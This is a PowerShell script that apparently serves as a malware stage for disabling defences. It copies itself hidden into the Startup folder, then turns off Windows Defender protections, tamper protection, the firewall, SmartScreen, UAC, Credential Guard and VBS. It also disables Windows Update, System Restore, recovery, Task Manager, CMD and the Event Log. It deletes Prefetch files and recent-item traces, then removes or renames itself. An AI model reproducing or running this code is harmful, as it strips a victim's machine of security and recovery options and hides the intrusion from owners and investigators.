$ErrorActionPreference = "SilentlyContinue"
$s = $MyInvocation.MyCommand.Path
$E = (Get-Process -Id $PID).Path
$f = if ($s) { $s } else { $E }
$tttttttttttttttttttt = [System.Environment]::GetFolderPath("startup")
$tttttttttttttttttttt = "$tttttttttttttttttttt\"
function Invoke-SelfReplication {
    $replicated = [System.IO.Path]::Combine($tttttttttttttttttttt, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f))
    if (-not (Test-Path ($tttttttttttttttttttt + [System.IO.Path]::GetFileName($f)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $f -Raw)
        (Get-Item $replicated).Attributes = 'Hidden'
    }
}
function Invoke-SelfDestruction {
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force
    $sn = [System.IO.Path]::GetFileNameWithoutExtension($f)
    $pf = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$sn*.pf"
    if ($pf) {
        foreach ($f in $pf) {
            Remove-Item -Path $f.FullName -Force
        }
    }
    $rf = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    if ($rf) {
        foreach ($f in $rf) {
            Remove-Item -Path $f.FullName -Recurse -Force
        }
    }
    if (-not (Test-Path ($tttttttttttttttttttt + [System.IO.Path]::GetFileName($f)))) {
        if ($s) {
            Remove-Item -Path $f -Force
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$f' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
        }
    } else {
        Rename-Item $f -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f)) -Force
    }
}
function Set-RegistryProperties {
    param ([string]$pt,[hashtable]$pr)
    if (-not (Test-Path $pt)) {
        New-Item -Path $pt -Force | Out-Null
    }
    foreach ($k in $pr.Keys) {
        Set-ItemProperty -Path $pt -Name $k -Value $pr[$k] -Type DWord -Force
    }
}
$b = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$r = "$b\Real-Time Protection"
$w = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
reagentc /disable
Set-RegistryProperties -pt "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -pr @{"Enabled" = 0}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -pr @{"DisableNotifications" = 1}
Set-RegistryProperties -pt $b -pr @{
    "DisableAntiSpyware" = 1
    "DisableApplicationGuard" = 1
    "DisableControlledFolderAccess" = 1
    "DisableCredentialGuard" = 1
    "DisableIntrusionPreventionSystem" = 1
    "DisableIOAVProtection" = 1
    "DisableRealtimeMonitoring" = 1
    "DisableRoutinelyTakingAction" = 1
    "DisableSpecialRunningModes" = 1
    "DisableTamperProtection" = 1
    "PUAProtection" = 0
    "ServiceKeepAlive" = 0
}
Set-RegistryProperties -pt $r -pr @{
    "DisableBehaviorMonitoring" = 1
    "DisableBlockAtFirstSeen" = 1
    "DisableCloudProtection" = 1
    "DisableOnAccessProtection" = 1
    "DisableScanOnRealtimeEnable" = 1
    "DisableScriptScanning" = 1
    "SubmitSamplesConsent" = 2
    "DisableNetworkProtection" = 1
}
Set-RegistryProperties -pt "$w\DomainProfile" -pr @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -pt "$w\StandardProfile" -pr @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -pt "$w\PublicProfile" -pr @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
Set-RegistryProperties -pt "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -pr @{"(Default)" = 0}
Set-RegistryProperties -pt "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -pr @{"EnableWebContentEvaluation" = 0}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -pr @{"NoAutoUpdate" = 1}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -pr @{"DisableSR" = 1; "DisableConfig" = 1}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -pr @{"DisableTaskMgr" = 1}
Set-RegistryProperties -pt "HKCU:\Software\Policies\Microsoft\Windows\System" -pr @{"DisableCMD" = 1}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -pr @{"fDenyTSConnections" = 1}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -pr @{"EnableLUA" = 0}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -pr @{"Disabled" = 1}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -pr @{"fAllowToGetHelp" = 0}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\Software\Microsoft\Windows Script Host\Settings" -pr @{"Enabled" = 0}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -pr @{"Start" = 4}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -pr @{"MaintenanceDisabled" = 1}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -pr @{"LsaCfgFlags" = 0}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -pr @{"LsaCfgFlags" = 0}
Set-RegistryProperties -pt "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -pr @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0; "HVCIMATRequired" = 0}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Microsoft\Hvsi" -pr @{"Enabled" = 0}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard" -pr @{"EnableExploitProtection" = 0}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -pr @{"AllowTelemetry" = 0}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -pr @{"DisableFileSyncNGSC" = 1}
Set-RegistryProperties -pt "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -pr @{"AllowCortana" = 0}
Invoke-SelfReplication
Invoke-SelfDestruction